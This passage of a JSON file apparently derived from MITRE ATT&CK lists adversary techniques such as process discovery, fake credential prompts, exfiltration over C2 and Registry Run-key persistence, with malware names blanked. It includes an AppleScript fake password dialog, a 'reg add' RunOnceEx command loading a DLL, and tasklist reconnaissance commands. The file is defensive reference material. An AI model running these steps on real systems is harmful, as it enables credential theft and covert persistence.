      "performs various checks for running processes including security software by looking for hard-coded process name values.",
      "has monitored critical processes to ensure resiliency.",
      "can gather a list of running processes by using .",
      "has run `cmd /c start /b tasklist` to enumerate processes.",
      "can iterate over the running processes to find a suitable injection target.",
      "has collected the PID of a malicious process.",
      "has a command to enumerate running processes and identify their owners.",
      "collected a list of process names that were hashed using a FNV-1a + XOR algorithm to check against similarly-hashed hardcoded blocklists.",
      "uses module networkDll for process list discovery.",
      "has used Windows-based utilities to carry out tasks including tasklist.exe.",
      "During  the threat actors used  on targeted systems.",
      "can collect process filenames and SID authority level.",
      "surveys a system upon check-in to discover running processes using the tasklist /v command.  RPC backdoors have also enumerated processes associated with specific open ports or named pipes.",
      "has used malware to obtain a list of running processes on the system.",
      "can collect the name and ID for every process running on the system.",
      "can detect a running process's PID on the infected machine.",
      "has the capability to list processes.",
      "has the ability to execute the `tasklist` command.",
      "has the ability to list running processes on the infected host.",
      "has the ability to list running processes through the use of `tasklist`.",
      "can search for specific processes to terminate.",
      "has the ability to list all running processes.",
      "can enumerate and examine running processes to determine if a debugger is present.",
      "has the ability to list processes.",
      "can enumerate the running processes on a compromised host.",
      "can search for different processes on a system.",
      "has checked for the Google Updater process to ensure  was loaded properly.",
      "can enumerate processes on a targeted system.",
      "has the ability to use  to list running processes.",
      "can enumerate and exclude selected processes on a compromised host to speed execution of memory scraping.",
      "can gather a list of all processes running on a victim's machine.",
      "has enumerated running processes on a compromised host to determine if it is running under the process name `dfrgui.exe`.",
      "s dropper can list all running processes.",
      "can enumerate processes on a targeted host.",
      "can use tasklist to gather information about the process running on the infected system.",
      "can list processes on targeted hosts.",
      "can identify processes associated with analytical tools.",
      "can enumerate processes running on a victim's machine.",
      "has the ability to use `GetWindowThreadProcessId` to identify the process behind a specified window.",
      "has gathered all of the running system processes.",
      "can check for blocklisted process names on a compromised host.",
      "can collect a list of running processes from an infected host.",
      "s shellcode attempted to find the process ID of the current process.",
      "After compromising a victim  lists all running processes.",
      "obtains a list of running processes using the function kill_unwanted.",
      "can search a list of running processes.",
      "has enumerated processes on targeted systems.",
      "has enumerated processes by ID name or privileges.",
      "has the ability to check running processes on a targeted system.",
      "has used a reconnaissance module to identify active processes and other associated loaded modules.",
      "can use GetCurrentProcessId for process discovery.",
      "can enumerate a list of running processes on a compromised machine.",
      "verifies the deletion of volume shadow copies by checking for the existence of the process ID related to the process created to delete these items.",
      "can search a list of running processes for Tr.exe.",
      "can examine running processes to determine if a debugger is present.",
      "can identify the process for a specific security product.",
      "can monitor the `/proc/ processes as a part of its persistence when executing with non-root permissions. If the process is found dead it resurrects the process.  processes can be matched to an associated Advisory Lock in the `/proc/locks` folder to ensure it doesn't spawn more than one process.",
      "can use its `Process List` command to enumerate processes on compromised hosts.",
      "has the ability to list processes on the compromised host.",
      "can determine if a user is logged in by checking to see if explorer.exe is running.",
      "has used ps to list processes.",
      "has used tools to enumerate processes on target hosts including Process Explorer.",
      "can enumerate processes including properties to determine if they have the Common Language Runtime (CLR) loaded.",
      "During  the threat actors obtained a list of running processes on a victim machine using `cmd /c tasklist > %temp%\\temp.ini`.",
      "has used EnumProcesses() to identify how many process are running in the environment.",
      "can list running processes on the system.",
      "has been observed enumerating local processes.",
      "During  the threat actors used the `tasklist` command as part of their advanced reconnaissance.",
      "can list the processes on the victims machine.",
      "can identify running processes on a compromised host.",
      "has a plugin designed to obtain a list of processes.",
      "has performed process name checks and has monitored applications.",
      "can enumerate through all open processes to search for any that have the string sql in their process name.",
      "can obtain a list of running processes.",
      "Beacon payload can collect information on process details.",
      "contains watchdog functionality that ensures its process is always running else spawns a new instance.",
      "can find information about processes running on local and remote systems.",
      "can obtain a list of current processes.",
      "can check if a specific process is running such as Kaspersky's `avp.exe`.",
      "can use `GetCurrentProcess` to enumerate processes.",
      "has been used to run the tasklist command on a compromised system.",
      "has used `ps ax | grep <name> | grep -v grep | ...` and `ps ax | grep -E...` to conduct process discovery.",
      "leveraged Sysmon to understand the processes services in the organization.",
      "can collect a list of running processes by calling CreateToolhelp32Snapshot.",
      "can use the ps command to discover other cryptocurrency miners active on the system.",
      "listed all running processes on the machine.",
      "has collected a list of running processes.",
      "has discovered system processes by calling `RmGetList`.",
      "can list the running processes and get the process ID and parent processs ID.",
      "has searched for the current processs PID.",
      "During  the threat actors used `tasklist` to collect a list of running processes on an infected system.",
      "has used get_tasklist to discover processes on the compromised host.",
      "has enumerated running processes on targeted systems including through the use of .",
      "can enumerate running processes including process grandchildren on targeted hosts.",
      "can identify the process it is currently running under and its number and pass this back to a command and control node.",
      "retrieves a list of all running processes on a victim host and stops all services containing the string sql likely to propagate ransomware activity to database files.",
      "can collect information on installed applications via Windows registry keys as well as collecting information on running processes.",
      "Scripts associated with  initial deployment can identify processes related to security tools and other botnet families for follow-on disabling during installation.",
      "has used the information stealer Grixba to check for a list of security processes.",
      "can use `ps aux` to enumerate running processes.",
      "can identify processes running on the victim machine such as security software during execution.",
      "can check if a process name contains creensaver.",
      "has used shell commands to list running processes.",
      "includes a module for establishing a process watchdog for itself identifying if the  process is still running.",
      "can use the Microsoft Win32 Restart Manager to kill processes with a specific handle or that are accessing resources it wants to encrypt.",
      "If sent the command `16002`  uses the `NSWorkspace runningApplications()` method to collect the process ID path to the executable bundle information and the filename of the executable for all running applications.",
      "identifies the `explorer.exe` process on the executing system.",
      "can determine if a running process has administrative privileges and terminate processes that interfere with encryption or exfiltration.",
      "can stop processes associated with files currently in use to maximize the impact of encryption.",
      "can terminate a list of specified services and processes.",
      "can identify and terminate specific services.",
      "has the ability to read `/proc/self/cmdline` to see if it is running as a monitored process.",
      "has run tasklist on a victim's machine and used infostealers to capture processes.",
      "checks whether the Bitlocker Drive Encryption Tools service is running."
    ],
    "id": "T1057",
    "name": "Process Discovery",
    "similar_words": [
      "Process Discovery"
    ]
  },
  "attack-pattern--91ce1ede-107f-4d8b-bf4c-735e8789c94b": {
    "description": "When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task. Adversaries can mimic this functionality to prompt users for credentials with a normal-looking prompt. This type of prompt can be accomplished with AppleScript:\n\nset thePassword to the text returned of (display dialog \"AdobeUpdater needs permission to check for updates. Please authenticate.\" default answer \"\")\n (Citation: OSX Keydnap malware)\n\nAdversaries can prompt a user for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite. (Citation: OSX Malware Exploits MacKeeper)",
    "example_uses": [
      "prompts the user for their credentials.",
      "presents an input prompt asking for the user's login and password.",
      "prompts the user for credentials.",
      "prompts users for their credentials.",
      "prompts the users for credentials."
    ],
    "id": "T1141",
    "name": "Input Prompt",
    "similar_words": [
      "Input Prompt"
    ]
  },
  "attack-pattern--92a78814-b191-47ca-909c-1ccfe3777414": {
    "description": "Adversaries may gain access to and use centralized software suites installed within an enterprise to execute commands and move laterally through the network. Configuration management and software deployment applications may be used in an enterprise network or cloud environment for routine administration purposes. These systems may also be integrated into CI/CD pipelines. Examples of such solutions include: SCCM, HBSS, Altiris, AWS Systems Manager, Microsoft Intune, Azure Arc, and GCP Deployment Manager.  Access to network-wide or enterprise-wide endpoint management software may enable an adversary to achieve remote code execution on all connected systems. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.SaaS-based configuration management services may allow for broad [Cloud Administration Command](https://attack.mitre.org/techniques/T1651) on cloud-hosted instances, as well as the execution of arbitrary commands on on-premises endpoints. For example, Microsoft Configuration Manager allows Global or Intune Administrators to run scripts as SYSTEM on on-premises devices joined to Entra ID.(Citation: SpecterOps Lateral Movement from Azure to On-Prem AD 2020) Such services may also utilize [Web Protocols](https://attack.mitre.org/techniques/T1071/001) to communicate back to adversary owned infrastructure.(Citation: Mitiga Security Advisory: SSM Agent as Remote Access Trojan)Network infrastructure devices may also have configuration management tools that can be similarly abused by adversaries.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to access specific functionality.",
    "example_uses": [
      "It is believed that a patch management system for an anti-virus product commonly installed among targeted companies was used to distribute the  malware.",
      "actors used a victim's endpoint management platform, Altiris, for lateral movement.",
      "compromised McAfee ePO to move laterally by distributing malware as a software deployment task.",
      "has used the commercially available tool RemoteExec for agentless remote code execution.",
      "has used RAdmin a remote software tool used to remotely control workstations and ATMs.",
      "actors used a victim's endpoint management platform Altiris for lateral movement.",
      "During  the threat actors used PDQ Deploy to move  and tools across the network."
    ],
    "id": "T1072",
    "name": "Software Deployment Tools",
    "similar_words": [
      "Third-party Software",
      "Software Deployment Tools"
    ]
  },
  "attack-pattern--92d7da27-2d91-488e-a00c-059dc162766d": {
    "description": "Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.",
    "example_uses": [
      "exfiltrates data over its C2 channel.",
      "sends collected files back over same C2 channel.",
      "can upload files from the victim's machine to its C2 server.",
      "performs data exfiltration over the control server channel using a custom protocol.",
      "can send screenshots files, keylogger data, files, and recorded audio back to the C2 server.",
      "has a tool that exfiltrates data over the C2 channel.",
      "exfiltrates screenshot files to its C2 server.",
      "Adversaries can direct  to upload files to the C2 Server.",
      "exfiltrates data to its C2 server over the same protocol as C2 communications.",
      "exfiltrates data over the same channel used for C2.",
      "exfiltrates data to its C2 server over the same protocol as C2 communications.",
      "exfiltrates data to its C2 server over the same protocol as C2 communications.",
      "is capable of reading files over the C2 channel.",
      "A  file stealer transfers collected files to a hardcoded C2 server.",
      "After data is collected by  malware, it is exfiltrated over the existing C2 channel.",
      "malware IndiaIndia saves information gathered about the victim to a file that is uploaded to one of its 10 C2 servers. Another  malware sample also performs exfiltration over the C2 channel.",
      "transferred compressed and encrypted RAR files containing exfiltration through the established backdoor command and control channel during operations.",
      "has the ability to send the compromised user's account name and hostname within a URL to C2.",
      "has exfiltrated data over the C2 channel.",
      "sent generated reports to the C2 via HTTP POST requests.",
      "has the ability to upload files from the compromised host over a DNS or HTTP C2 channel.",
      "has sent system information to a C2 server via HTTP and HTTPS POST requests.",
      "can upload files from a compromised host over its C2 channel.",
      "can upload files from a victim's machine over the C2 channel.",
      "has the ability to download files from the infected host to the command and control (C2) server.",
      "can exfiltrate collected data to its C2 server.",
      "collected data is exfiltrated over the same channel used for C2.",
      "can send collected data in JSON format to C2.",
      "has exfiltrated collected host information to a C2 server.",
      "can use SMTP and DNS for file exfiltration and C2.",
      "can send collected victim data to its C2 server.",
      "can send victim data to an actor-controlled C2 server.",
      "has sent stolen credentials and other data to its C2 server.",
      "has exfiltrated victim data using HTTP POST requests to its C2 servers.",
      "has used malware that exfiltrates stolen data to its C2 server.",
      "has sent system information to its C2 server using HTTP.",
      "has used  C2 beacons for data exfiltration.",
      "can remotely exfiltrate sensitive information from a compromised AD FS server.",
      "has exfiltrated data via HTTP to already established C2 servers.",
      "has uploaded files and data to its C2 servers.",
      "can exfiltrate files from an infected machine to its C2 server.",
      "can exfiltrate collected documents through C2 channels.",
      "used Web shells and  for C2 and to exfiltrate data.",
      "exfiltrated data over its C2 channel.",
      "exfiltrates data stolen from a system over its C2 channel.",
      "can send data gathered from a target through the command and control channel.",
      "can send screenshots files keylogger data files and recorded audio back to the C2 server.",
      "exfiltrates data over its email C2 channel.",
      "can send data it retrieves to the C2 server.",
      "can send information about the compromised host and upload data to a hardcoded C2 server.",
      "can exfiltrate collected data to its C2 servers.",
      "has exfiltrated data over its C2 channel.",
      "can send stolen information to C2 nodes including passwords accounts and emails.",
      "has used HTTP POSTs to exfil gathered information.",
      "exfiltrates collected data over email via SMTP/S and POP3/S C2 channels.",
      "uses existing command and control channels to retrieve captured cryptocurrency wallet credentials.",
      "can exfiltrate gathered data to a hardcoded C2 URL via HTTP POST.",
      "has uploaded stolen files and data from a victim's machine over its C2 channel.",
      "has uploaded data and files from a compromised host to its C2 servers.",
      "can send collected data in JSON format to its C2 server.",
      "has exfiltrated stolen victim data through C2 communications.",
      "can send the data it collects to the C2 server.",
      "can exfiltrate host and malware information to C2 servers.",
      "has exfiltrated data and files over a C2 channel through its various tools and malware.",
      "has sent victim data to its C2 servers.",
      "has exfiltrated host environment information to an external C2 domain via port 9006.",
      "has exfiltrated data to the C2 server.",
      "has exfiltrated data to the designated C2 server using HTTP POST requests.",
      "performs exfiltration over  which is also used for the C2 channel.",
      "has used Ngrok to establish C2 and exfiltrate data.",
      "can send data from the victim host through a DNS C2 channel.",
      "Multi File Exfiltrator module can exfiltrate multiple files from a compromised host as an HTTP response over C2.",
      "has the ability to send collected files over its C2.",
      "can exfiltrate data over actor-controlled C2 servers via HTTP or TCP.",
      "During   used its Cloudflare services C2 channels for data exfiltration.",
      "During  the threat actors uploaded stolen files to their C2 servers.",
      "can execute commands including gathering user information and send the results to C2.",
      "backdoor has exfiltrated data using the already opened channel with its C&C server.",
      "During   exfiltrated data from a compromised host to actor-controlled C2 servers.",
      "sends compromised victim information via HTTP.",
      "has used its C2 channel to exfiltrate data.",
      "Data exfiltration is done by  using the already opened channel with the C2 server.",
      "exfiltrates collected information from its r1.log file to the external C2 server.",
      "can exfiltrate stolen information over its C2.",
      "has sent system information and files over the C2 channel.",
      "can load a plugin to exfiltrate stolen files to SMB shares also used in C2.",
      "has the ability to initiate contact with command and control (C2) to exfiltrate stolen data.",
      "can send collected files back over same C2 channel.",
      "uploads files and data from a compromised host over the existing C2 channel.",
      "exfiltrates targeted file extensions in the /Users/ folder to the command and control server via unencrypted HTTP. Network packets contain a string with two pieces of information: a file path and the contents of the file in a base64 encoded string.",
      "has the ability to upload exfiltrated files to a C2 server.",
      "can upload files over the C2 channel from the infected host.",
      "has sent user and system information to a C2 server via HTTP POST requests.",
      "can exfiltrate locally stored data via its C2.",
      "exfiltrates data from a supplied path over its C2 channel.",
      "has the ability to exfiltrate data over the C2 channel.",
      "has used a PowerShell document stealer module to pack and exfiltrate .txt .pdf .xls or .doc files smaller than 5MB that were modified during the past two days.",
      "can send data and files from a compromised host to its C2 server.",
      "can send network system data and files to its C2 server.",
      "can exfiltrate collected data via C2.",
      "sends information about hardware profiles and previously-received commands back to the C2 server in a POST-request.",
      "has uploaded collected data and files from a compromised host to its C2 server.",
      "has sent data collected from a compromised host to its C2 servers.",
      "has exfiltrated files via the Dropbox API C2.",
      "has exfiltrated data to its C2 server.",
      "can exfiltrate files via the C2 channel.",
      "can transfer files from an infected host to the C2 server.",
      "can exfiltrate files over C2 infrastructure.",
      "can upload files over the C2 channel.",
      "has exfiltrated collected data to its C2 via POST requests.",
      "During  threat actors used the XServer backdoor to exfiltrate data.",
      "has uploaded a file containing debugger logs network information and system information to the C2.",
      "has exfiltrated information gathered from the infected system to the C2 server.",
      "can upload collected files and data to its C2 server.",
      "has sent collected data from a compromised host to its C2 servers.",
      "has exfiltrated stolen files to its C2 server.",
      "has added the exfiltrated data to the URL over the C2 channel.",
      "can send data gathered from the infected machine via HTTP POST request to the C2.",
      "has used HTTP to receive stolen information from the infected machine.",
      "can exfiltrate collected information from the host to the C2 server.",
      "can upload files and information from a compromised host to its C2 server.",
      "can sends the collected financial data to the C2 server.",
      "has exfiltrated domain credentials and network enumeration information over command and control (C2) channels.",
      "has sent data and files to its C2 server.",
      "can exfiltrate files from the victim using the download command.",
      "can upload files and information from a compromised host to its C2 servers.",
      "can upload files matching a hardcoded set of extensions such as .doc .docx .pdf and .rar to its C2 server.",
      "can execute the command code do_upload to send files to C2.",
      "can connect to C2 for data exfiltration.",
      "During  the threat actors collected information via  which sent the data back to the adversary's C2.",
      "has transmitted collected files and data to its C2 server.",
      "can exfiltrate data gathered from the infected system via the established Exchange Web Services API C2 channel.",
      "A  file stealer can transfer collected files to a hardcoded C2 server.",
      "can send collected data including screenshots over its C2 channel.",
      "has the ability to exfiltrate data over the Microsoft Outlook C2 channel.",
      "can exfiltrate files over the existing C2 channel.",
      "has used C2 infrastructure to receive exfiltrated data.",
      "After data is collected by  malware it is exfiltrated over the existing C2 channel.",
      "can exfiltrate SSH credentials through custom DNS queries.",
      "has sent data and files from a compromised host to its C2 servers.",
      "has the ability to send information staged on a compromised host externally to C2.",
      "sends device and other collected data back to the C2 using the established C2 channels over TCP.",
      "has sent data related to a compromise host over its C2 channel.",
      "can exfiltrate data over the C2 channel.",
      "has the ability to exfiltrate stolen victim data through its C2 channel.",
      "can exfiltrate data over the primary C2 channel (Dropbox HTTP API).",
      "During  threat actors used HTTP to transfer data from compromised Exchange servers.",
      "can use email image attachments with embedded data for receiving C2 commands and data exfiltration.",
      "data exfiltration takes place over HTTP channels.",
      "During the initial  command and control check-in  will transmit collected system information encrypted using RC4.",
      "can send information about the targeted system to C2 including captured passwords OS build hostname and username.",
      "can upload collected files to the command-and-control server.",
      "can exfiltrate encrypted system information to the C2 server.",
      "uses existing HTTP-based command and control channels for exfiltration.",
      "delivered a PowerShell script capable of recursively scanning victim machines looking for various file types before exfiltrating identified files via HTTP.",
      "exfiltrates specific files through its command and control framework.",
      "can exfiltrate collected data over C2 channels.",
      "exfiltrated staged data using tools such as Putty and WinSCP communicating with command and control servers.",
      "exfiltrates a list of outbound and inbound SSH sessions using OpenSSH's `known_host` files and `wtmp` records.  can exfiltrate SSH credentials through custom DNS queries or use the command `Xcat` to send the process's ssh session's credentials to the C2 server.",
      "has used IMAP and SMTPS for exfiltration via tools such as .",
      "can use an actor-controlled OneDrive account for C2 communication and exfiltration.",
      "encrypts collected system data then exfiltrates via existing command and control channels.",
      "exfiltrates collected email credentials via HTTP POST to command and control servers.",
      "utilizes HTTP to retrieve and exfiltrate information staged using .",
      "included use of existing command and control channels for data exfiltration.",
      "To exfiltrate data  configures each module to send an obfuscated JSON blob to hardcoded URL endpoints or paths aligned to the module name.",
      "retrieves files that match the pattern defined in the INAME_QUERY variable within the user's home directory such as `*test.txt` and are below a specific size limit. It then archives the files and exfiltrates the data over its C2 channel.",
      "has exfiltrated collected credentials to the C2 server.",
      "exfiltrates collected data via command and control channels.",
      "can exfiltrate files via its email C2 channel.",
      "exfiltrated collected data over existing command and control channels during .",
      "will exfiltrate victim system information along with the encryption key via an HTTP POST.",
      "can send staged files to C2 for exfiltration.",
      "can use its HTTP C2 channel for exfiltration.",
      "has exfiltrated collected data over existing HTTP and HTTPS C2 channels.",
      "exfiltrates data via HTTP over existing command and control channels.",
      "transmitted collected victim host information via HTTP POST to command and control infrastructure.",
      "can use an attacker-controlled OneDrive account to receive C2 commands and to exfiltrate files.",
      "exfiltrates collected information to its command and control infrastructure."
    ],
    "id": "T1041",
    "name": "Exfiltration Over C2 Channel",
    "similar_words": [
      "Exfiltration Over Command and Control Channel",
      "Exfiltration Over C2 Channel"
    ]
  },
  "attack-pattern--9422fc14-1c43-410d-ab0f-a709b76c72dc": {
    "description": "Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n* HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n* HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n* HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n* HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n\nThe HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx is also available but is not created by default on Windows Visa and newer. Registry run key entries can reference programs directly or list them as a dependency. (Citation: Microsoft RunOnceEx APR 2018) For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\" (Citation: Oddvar Moe RunOnceEx Mar 2018)\n\nThe following Registry keys can be used to set startup folder items for persistence:\n* HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\n* HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\n* HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\n* HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.",
    "example_uses": [
      "version of  adds a registry key to HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run for persistence.",
      "Several  backdoors achieved persistence by adding a Run key.",
      "A  tool can add the binary’s path to the Registry key Software\\Microsoft\\Windows\\CurrentVersion\\Run to add persistence.",
      "A  Javascript backdoor added a local_update_check value under the Registry key HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run to establish persistence. Additionally, a  custom executable containing Metasploit shellcode is saved to the Startup folder to gain persistence.",
      "adds itself to the Registry key HKEY_CURRENT_USER\\Software\\Microsoft\\CurrentVersion\\Run\\ for persistence.",
      "establishes persistence under the Registry key HKCU\\Software\\Run auto_update.",
      "creates a Registry key to ensure a file gets executed upon reboot in order to establish persistence.",
      "has used Registry Run keys for persistence. The group has also set a Startup path to launch the PowerShell shell command and download Cobalt Strike.",
      "An  HTTP malware variant establishes persistence by setting the Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Windows Debug Tools-%LOCALAPPDATA%\\.",
      "added the registry value ntdll to the Registry Run key to establish persistence.",
      "gains persistence by adding the Registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce.",
      "uses a batch file that configures the ComSysApp service to autostart in order to establish persistence.",
      "created a shortcut in the Windows startup folder to launch a PowerShell script each time the user logs in to establish persistence.",
      "Some  variants establish persistence by modifying the Registry key HKU\\<SID>\\Software\\Microsoft\\Windows\\CurrentVersion\\Run:%appdata%\\NeutralApp\\NeutralApp.exe.",
      "malware can create a .lnk file and add a Registry Run key to establish persistence.",
      "uses run keys for persistence on Windows",
      "stores a configuration files in the startup directory to automatically execute commands in order to persist across reboots.",
      "establishes persistence in the Startup folder.",
      "adds a Registry Run key for persistence and adds a script in the Startup folder to deploy the payload.",
      "is capable of writing to a Registry Run key to establish.",
      "modifies the %regrun% Registry to point itself to an autostart mechanism.",
      "adds itself to the Registry key Software\\Microsoft\\Windows\\CurrentVersion\\Run to establish persistence upon reboot.",
      "adds a sub-key under several Registry run keys.",
      "creates run key Registry entries pointing to a malicious executable dropped to disk.",
      "achieves persistence by adding a shortcut of itself to the startup path in the Registry.",
      "establishes persistence by creating the Registry key HKCU\\Software\\Microsoft\\Windows\\Run.",
      "has added persistence via the Registry key HKCU\\Software\\Microsoft\\CurrentVersion\\Run\\.",
      "has added Registry Run keys to establish persistence.",
      "creates a Registry start-up entry to establish persistence.",
      "adds itself to the startup folder or adds itself to the Registry key SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run for persistence.",
      "has used JavaScript to create a shortcut file in the Startup folder that points to its main backdoor.",
      "creates run key Registry entries pointing to malicious DLLs dropped to disk.",
      "copies itself to disk and creates an associated run key Registry entry to establish.",
      "New-UserPersistenceOption Persistence argument can be used to establish via the HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Registry key.",
      "can establish using a Registry run key.",
      "has used a batch script that adds a Registry Run key to establish malware persistence.",
      "establishes persistence by creating a shortcut in the Start Menu folder.",
      "adds a Registry Run key to establish persistence.",
      "uses PowerShell to add a Registry Run key in order to establish persistence.",
      "places scripts in the startup folder for persistence.",
      "can establish persistence by adding Registry Run keys.",
      "malware has used Registry Run keys to establish persistence.",
      "can establish persistence by creating a .lnk file in the Start menu.",
      "creates a shortcut file and saves it in a Startup folder to establish persistence.",
      "achieves persistence by setting a Registry Run key, with the path depending on whether the victim account has user or administrator access.",
      "adds a Registry Run key for ctfmon.exe to establish persistence.",
      "adds itself to a Registry Run key with the name guidVGA or guidVSA.",
      "has used a Registry Run key to establish persistence by executing JavaScript code within the rundll32.exe process.",
      "Most  samples maintain persistence by setting the Registry Run key SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ in the HKLM or HKCU hive, with the Registry value and file name varying by sample.",
      "registers itself under a Registry Run key with the name \"USB Disk Security.\"",
      "may create a .lnk file to itself that is saved in the Start menu folder. It may also create the Registry key HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ IMJPMIJ8.1{3 characters of Unique Identifier}.",
      "has established persistence by creating autostart extensibility point (ASEP) Registry entries in the Run key and other Registry keys, as well as by creating shortcuts in the Internet Explorer Quick Start folder.",
      "establishes persistence by adding a Registry Run key.",
      "One persistence mechanism used by  is to set itself to be executed at system startup by adding a Registry value under one of the following Registry keys: <br>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ <br>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ <br>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run <br>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run",
      "achieves persistence by creating a shortcut to itself in the CSIDL_STARTUP directory.",
      "Variants of  have added Run Registry keys to establish persistence.",
      "can add a Run key entry in the Registry to establish persistence.",
      "If establishing persistence by installation as a new service fails, one variant of  establishes persistence for the created .exe file by setting the following Registry key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\svchost : %APPDATA%\\Microsoft\\Network\\svchost.exe. Other variants have set the following Registry key for persistence: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\imejp : [self].",
      "achieves persistence by creating a Registry entry in HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run.",
      "The  3 variant drops its main DLL component and then creates a .lnk shortcut to that file in the startup folder.",
      "installs a registry Run key to establish persistence.",
      "has been loaded through DLL side-loading of a legitimate Citrix executable that is set to persist through the registry run key location: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ssonsvr.exe",
      "adds Registry Run keys to achieve persistence.",
      "creates a Registry Run key to establish persistence.",
      "has been known to establish persistence by adding programs to the Run Registry key.",
      "To establish persistence,  identifies the Start Menu Startup directory and drops a link to its own executable disguised as an “Office Start,” “Yahoo Talk,” “MSN Gaming Z0ne,” or “MSN Talk” shortcut.",
      "malware has created Registry Run and RunOnce keys to establish persistence, and has also added items to the Startup folder.",
      "has established persistence by setting the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run key value for wdm to the path of the executable. It has also used the Registry entry HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run vpdn “%ALLUSERPROFILE%\\%APPDATA%\\vpdn\\VPDN_LU.exe” to establish persistence.",
      "achieves persistence by adding itself to the HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Registry key.",
      "achieves persistence by making an entry in the Registry's Run key.",
      "achieves persistence by creating a shortcut in the current user's Startup folder.",
      "creates a Registry Run key to establish persistence.",
      "attempts to add a shortcut file in the Startup folder to achieve persistence. If this fails, it attempts to add Registry Run keys.",
      "creates the following Registry entry: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Micromedia.",
      "achieves persistence by using various Registry Run keys.",
      "is capable of persisting via the Registry Run key or a .lnk file stored in the Startup directory.",
      "establishes persistence through a Registry Run key.",
      "tries to add a Registry Run key under the name \"Windows Update\" to establish persistence.",
      "The \"SCOUT\" variant of  achieves persistence by adding itself to the HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Registry key.",
      "installs itself under Registry Run key to establish persistence.",
      "achieves persistence by creating a shortcut in the Startup folder.",
      "establishes persistence via a Registry Run key.",
      "can create a shortcut in the Windows startup folder for persistence.",
      "can create a link to itself in the Startup folder to automatically start itself upon system restart.",
      "has established persistence by using the Registry option in PowerShell Empire to add a Run key.",
      "persists by creating a Registry entry in HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\.",
      "copies itself to the Startup folder to establish persistence.",
      "has added the path of its second-stage malware to the startup folder to achieve persistence. One of its file stealers has also persisted by adding a Registry Run key.",
      "has used Registry Run keys to establish persistence for its downloader tools known as HARDTACK and SHIPBREAD.",
      "malware attempts to maintain persistence by saving itself in the Start menu folder or by adding a Registry Run key.",
      "A dropper used by  installs itself into the ASEP Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run with a value named McUpdate.",
      "added Registry Run keys to establish persistence.",
      "has been known to establish persistence by adding programs to the Run Registry key."
    ],
    "id": "T1060",
    "name": "Registry Run Keys / Startup Folder",
    "similar_words": [
      "Registry Run Keys / Startup Folder"
    ]
  },
  "attack-pattern--970cdb5c-02fb-4c38-b17e-d6327cf3c810": {
    "description": "Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process. Adversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.",
    "example_uses": [
      "created several .LNK files on the victim's machine.",
      "manipulated .lnk files to gather user credentials in conjunction with .",
      "establishes persistence via a .lnk file in the victim’s startup path.",
